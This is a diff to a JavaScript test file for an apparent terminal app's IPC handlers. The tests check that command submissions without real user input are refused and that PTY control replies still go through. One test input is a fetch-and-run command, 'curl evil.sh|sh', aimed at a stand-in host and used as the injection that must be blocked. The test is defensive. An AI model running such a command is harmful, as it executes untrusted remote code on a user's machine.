@@ -808,15 +808,31 @@ describe('registerIpcHandlers', () => {
     expect(forgetCredential).toHaveBeenCalledWith('c1')
   })
 
-  it('accepts a terminal write only after the main process has seen real input', () => {
+  it('refuses a terminal submit with no real input behind it', () => {
     const { on } = collectHandlers()
     const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
 
     on.get('terminal:write')?.(inactiveAppEvent, 't1', 'curl evil.sh|sh\r')
     expect(write).not.toHaveBeenCalled()
+    on.get('terminal:write')?.(inactiveAppEvent, 't1', 'evil\n')
+    expect(write).not.toHaveBeenCalled()
 
     on.get('terminal:write')?.(activeAppEvent, 't1', 'ls\r')
     expect(write).toHaveBeenCalledWith('t1', 'ls\r')
+  })
+
+  it('always forwards writes that cannot submit, including PTY replies', () => {
+    const { on } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+
+    // The PTY solicits these and the terminal must answer with no user input:
+    // a DSR cursor-position reply, a device-attributes reply, a focus report.
+    // Gating the whole channel would hang whatever asked.
+    for (const reply of ['\u001b[24;80R', '\u001b[?62;c', '\u001b[I', 'ls']) {
+      on.get('terminal:write')?.(inactiveAppEvent, 't1', reply)
+      expect(write).toHaveBeenCalledWith('t1', reply)
+    }
+    expect(write).toHaveBeenCalledTimes(4)
   })
 
   it('defaults password conflicts to keeping what is already stored', async () => {
